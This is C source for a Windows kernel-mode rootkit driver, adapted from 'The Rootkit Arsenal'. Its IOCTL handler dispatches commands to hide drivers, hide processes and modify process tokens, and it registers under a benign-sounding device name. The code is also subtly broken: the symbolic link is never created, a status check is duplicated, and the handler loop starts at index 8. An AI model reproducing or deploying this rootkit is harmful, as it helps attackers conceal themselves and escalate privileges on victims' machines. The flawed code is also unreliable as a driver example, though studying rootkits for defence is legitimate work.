//Most of this code belongs to Reverend Bill Blunden.
//It comes from his book: 'The Rootkit Arsenal: Escape and Evasion in the Dark Corners of the System' First Edition
//some modifications were mady by Aaron Sedlacek
//Written 07/28/2015
#include "ntddk.h"
#include "ioctl_defs.h"
#include "devices.h"
#include "datatypes.h"
#include "debug.h"

//Globals
PDEVICE_OBJECT MSNetDiagDeviceObject;
PDRIVER_OBJECT DriverObjectRef;

//KMD-specific includes
#include "ver.h"
#include "kmd.h"
#include "task.h"
#include "module.h"
#include "token.h"

//Toggles Debug logging
//#define LOG_OFF

NTSTATUS defaultDispatch(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIRP)
{
	((*pIRP).IoStatus).Status = STATUS_SUCCESS;
	((*pIRP).IoStatus).Information = 0;
	IoCompleteRequest(pIRP, IO_NO_INCREMENT);
	return (STATUS_SUCCESS);
}

NTSTATUS dispatchIOControl(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIRP)
{
	PIO_STACK_LOCATION irpStack;
	PVOID inputBuffer;
	PVOID outputBuffer;
	ULONG inputBufferLength;
	ULONG outputBufferLength;
	ULONG ioctrlcode;
	NTSTATUS ntStatus;

	ntStatus = STATUS_SUCCESS;
	((*pIRP).IoStatus).Status = STATUS_SUCCESS;
	((*pIRP).IoStatus).Information = 0;
	inputBuffer = (*pIRP).AssociatedIrp.SystemBuffer;

	outputBuffer = (*pIRP).AssociatedIrp.SystemBuffer;
	//get a pointer to the caller ' s stack location in the given IRP
	//This is where the function codes and other parameters are located
	irpStack = IoGetCurrentIrpStackLocation(pIRP);
	inputBufferLength = (*irpStack).Parameters.DeviceIoControl.InputBufferLength;
	outputBufferLength = (*irpStack).Parameters.DeviceIoControl.OutputBufferLength;
	ioctrlcode = (*irpStack).Parameters.DeviceIoControl.IoControlCode;
	DBG_TRACE("dispatchIOControl", "Received a conmand");
	if (!isOSSupported())
	{
		DBG_TRACE("dispatchIOControl", "Platform not supported, conmand dismissed");
		IoCompleteRequest(pIRP, IO_NO_INCREMENT);
		return(ntStatus);
	}
	switch (ioctrlcode)
	{
	case IOCTL_LIST_TASK:
	{
		DBG_TRACE("dispatchIOControl", "Listing Tasks");
		ListTasks();
	}break;
	case IOCTL_LIST_DRVR:
	{
		DBG_TRACE("dispatchIOControl", "Listing Drivers");
		ListDrivers();
	}break;
	case IOCTL_HIDE_DRVR:
	{
		DBG_TRACE("dispatchIOControl", "Hiding Driver");
		HideDriver((UCHAR*)inputBuffer);
	}break;
	case IOCTL_HIDE_TASK:
	{
		DBG_TRACE("dispatchIOControl ", "Hiding Task");
		HideTask((DWORD*)inputBuffer);
	}break;
	case IOCTL_MOD_TOKEN:
	{
		DBG_TRACE("dispatchIOControl", "Modifying Token");
		ModifyToken((DWORD*)inputBuffer);
	}break;
	default:
	{
		DBG_TRACE("dispatchIOControl", "control code not recognized");
	}break;
	}
	IoCompleteRequest(pIRP, IO_NO_INCREMENT);
	return (ntStatus);
}
NTSTATUS RegisterDriverDeviceName(IN PDRIVER_OBJECT DriverObject)
{
	NTSTATUS ntStatus;
	UNICODE_STRING unicodeString;
	RtlInitUnicodeString(&unicodeString, DeviceNameBuffer);
	ntStatus = IoCreateDevice
		(
		DriverObject,			//pointer to driver object
		0,						//# bytes allocated for device extension of device object
		&unicodeString,			//unicode string containing device name
		FILE_DEVICE_RK,			//driver type(vendor defined)
		0,						//one or more system - defined constants, OR - ed together
		TRUE,					//the device object is an exclusive device
		&MSNetDiagDeviceObject	//pointer to global device object
		);
	return(ntStatus);
}

NTSTATUS RegisterDriverDeviceLink()
{
	NTSTATUS ntStatus;
	UNICODE_STRING unicodeString;
	UNICODE_STRING unicodeLinkString;
	RtlInitUnicodeString(&unicodeString, DeviceNameBuffer);
	RtlInitUnicodeString(&unicodeLinkString, DeviceLinkBuffer);
	ntStatus = IoCreateSymbolicLink
		(
		&unicodeLinkString,
		&unicodeString
		);
	return(ntStatus);
}

VOID OnUnload(IN PDRIVER_OBJECT DriverObject)
{
	PDEVICE_OBJECT deviceObj;
	UNICODE_STRING unicodeString;
	DBG_TRACE("OnUnload", "Received signal to unload the driver");
	deviceObj = (*DriverObject).DeviceObject;
	if (deviceObj != NULL)
	{
		// delete symbolic link
		DBG_TRACE("OnUnload", "Unregistering driver's symbolic link");
		RtlInitUnicodeString(&unicodeString, DeviceLinkBuffer);
		IoDeleteSymbolicLink(&unicodeString);
		//delete device object
		DBG_TRACE("OnUnload", "Un registering driver's device name");
		IoDeleteDevice((*DriverObject).DeviceObject);
	}
	DBG_TRACE("OnUnload", "Driver clean-up completed- - - - - - - - - - - - - - - - - - - - - - - -- -");
	return;
}

//This is the main driver entry. This code is executed when the driver is first created.
NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING regPath)
{
	int i;
	NTSTATUS ntStatus;

	DBG_TRACE("Driver Entry", "Driver is loading------------------------------");
	ntStatus = RegisterDriverDeviceName(pDriverObject);
	if (!NT_SUCCESS(ntStatus))
	{
		DBG_TRACE("Driver Entry", "Failed to create device");
		return(ntStatus);
	}

	if (!NT_SUCCESS(ntStatus))
	{
		DBG_TRACE("Driver Entry", "Failed to create symbolic link");
		return (ntStatus);
	}
	for (i = 8; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
	{
		(*pDriverObject).MajorFunction[i] = defaultDispatch;
	}
	(*pDriverObject).MajorFunction[IRP_MJ_DEVICE_CONTROL] = dispatchIOControl;
	(*pDriverObject).DriverUnload = OnUnload;

	// set global reference variable
	DriverObjectRef = pDriverObject;

	checkOSVersion();

	DBG_TRACE("dispatchIOControl", "Listing Tasks");
	ListTasks();

	DBG_TRACE("Driver Entry", "DriverEntry() is done");
	return(STATUS_SUCCESS);
}